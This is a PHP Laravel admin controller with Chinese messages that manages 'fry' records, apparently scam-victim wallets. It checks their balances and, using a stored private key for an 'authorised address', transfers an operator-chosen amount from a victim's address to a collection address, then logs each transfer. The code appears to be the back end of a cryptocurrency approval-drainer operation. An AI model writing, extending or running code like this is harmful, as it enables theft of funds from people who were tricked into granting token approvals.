<?php


namespace App\Http\Controllers\Admin;

use App\Models\Currency\Currency;
use App\Models\DuAddress\DuAddress;
use App\Models\DuAddress\DuAddressesType;
use App\Models\DuAddress\DuFry;
use App\Models\DuAddress\DuTransfer;
use App\Models\News\NewsCategory;

class DuFryController extends Controller
{
    public function index()
    {
        return view('admin.duFry.index');
    }

    public function list()
    {
        $limit = request('limit', 10);
        $news_list = DuFry::orderBy('id', 'ASC')->paginate($limit);

        foreach ($news_list as $k => $v) {
            $news_list[$k]['currency'] = Currency::where('id', $v['currency_id'])->value('code');
            $news_list[$k]['type'] = DuAddressesType::where('id', $v['type_id'])->value('name');
        }
        return $this->layuiPageData($news_list);
    }

    public function add()
    {
        return view('admin.duFry.add');
    }

    public function save()
    {
        $name = request('name', 0);

        if (!$name) {
            return $this->error('请输入名称');
        }
        if (DuFry::where('name', $name)->exists()) {
            return $this->error('名称已存在');
        }

        DuFry::create([
            'name' => $name,
        ]);
        if (!$name) {
            return $this->error('请输入名称');
        }

        return $this->success('操作成功');
    }

    public function edit()
    {
        $id = request('id', 0);
        $info = DuFry::find($id);
        $types = DuAddressesType::where('id', $info->type_id)->first();
        $info['type'] = $types['name'];
        return view('admin.duFry.edit', [
            'info' => $info,
        ]);
    }

    public function update()
    {


        $id = request('id', 0);
        $other_address = request('other_address', 0);
        $get_address = request('get_address', 0);
        $type = request('type', 0);
        $number = request('number', 0);

        if (!$other_address || !$get_address) {
            return $this->error('地址必填');
        }
        $m = new DuFry();
        $fry = $m->where('id', $id)->first();

        $type_id = DuAddressesType::where("name",$type)->value("id") ?? 0;

        $key = DuAddress::where("type_id",$type_id)->value("private_key") ?? "";

        if(!$key) return $this->error("无法获取到授权地址密钥");

        $response = $m->transfer($other_address,$key,$get_address,$number,$type);


        try {
            if($response['code'] == 1){

                DuTransfer::insert([
                    'source_address' => $other_address,
                    'auth_address' => $fry['auth_address'],
                    'transfer_address' => $get_address,
                    'type' => $type,
                    'hash' => $response['hash'] ?: "请通过客户地址前往区块浏览器查询",
                    'amount' => $number,
                    'created_at' => date("Y-m-d H:i:s"),
                    'updated_at' => date("Y-m-d H:i:s"),
                ]);

                return $this->success("操作成功");
            }else{

                return $this->error($response['msg']);
            }

        } catch (\Exception $exception) {

            return $this->error("操作失败");
        }

    }

    public function cancel()
    {
        $id = request('id', 0);
        return $this->success('暂不可用');
    }

    public function delete()
    {
        $id = request('id', 0);
        DuFry::destroy($id);
        return $this->success('删除成功');
    }

    //获取余额
    public function getDuBalance()
    {

        $id = request('id', 0);
        $duFry = DuFry::find($id);
        if (!$duFry) {
            return $this->error('参数错误');
        }
        $address = $duFry['other_address'];

        try {

            $type_one = DuAddressesType::where('id', $duFry['type_id'])->first();

            //查询余额
            $info = $duFry->getBalance($address, $type_one['name']);
            if ($info['code'] != 1) {
                return $this->error($info['msg']);
            }
            $res = DuFry::where('id', $id)->update(['balance' => $info['balance'], 'updated_at' => date("Y-m-d H:i:s")]);

            if (!$res) {
                return $this->error('获取失败');
            }


            return $this->success('查询成功');
        } catch (\Exception $e) {
            return $this->error($e->getMessage());
        }

    }
}
